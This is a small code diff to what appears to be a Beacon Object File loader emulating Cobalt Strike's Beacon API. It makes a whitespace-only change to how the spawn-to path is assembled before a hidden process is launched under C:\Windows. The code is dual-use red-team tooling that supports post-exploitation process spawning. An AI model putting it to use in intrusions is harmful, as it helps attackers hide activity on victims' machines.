@@ -10,10 +10,10 @@ VOID beacon_get_spawn_to(BOOL x86, PCHAR buffer, INT length) {
         return;
     }
     if (x86) {
-        tempBufferPath = "C:\\Windows\\"X86PATH"\\"DEFAULTPROCESSNAME;
+        tempBufferPath = "C:\\Windows\\" X86PATH "\\" DEFAULTPROCESSNAME;
     }
     else {
-        tempBufferPath = "C:\\Windows\\"X64PATH"\\"DEFAULTPROCESSNAME;
+        tempBufferPath = "C:\\Windows\\" X64PATH "\\" DEFAULTPROCESSNAME;
     }
 
     if (lstrlenA(tempBufferPath) > length) {
@@ -26,10 +26,10 @@ VOID beacon_get_spawn_to(BOOL x86, PCHAR buffer, INT length) {
 BOOL beacon_spawn_temporary_process(BOOL x86, BOOL ignoreToken, STARTUPINFO * sInfo, PROCESS_INFORMATION * pInfo) {
     BOOL bSuccess = FALSE;
     if (x86) {
-        bSuccess = CreateProcessA(NULL, (PCHAR)"C:\\Windows\\"X86PATH"\\"DEFAULTPROCESSNAME, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, sInfo, pInfo);
+        bSuccess = CreateProcessA(NULL, (PCHAR)"C:\\Windows\\" X86PATH "\\" DEFAULTPROCESSNAME, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, sInfo, pInfo);
     }
     else {
-        bSuccess = CreateProcessA(NULL, (PCHAR)"C:\\Windows\\"X64PATH"\\"DEFAULTPROCESSNAME, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, sInfo, pInfo);
+        bSuccess = CreateProcessA(NULL, (PCHAR)"C:\\Windows\\" X64PATH "\\" DEFAULTPROCESSNAME, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, sInfo, pInfo);
     }
     return bSuccess;
 }
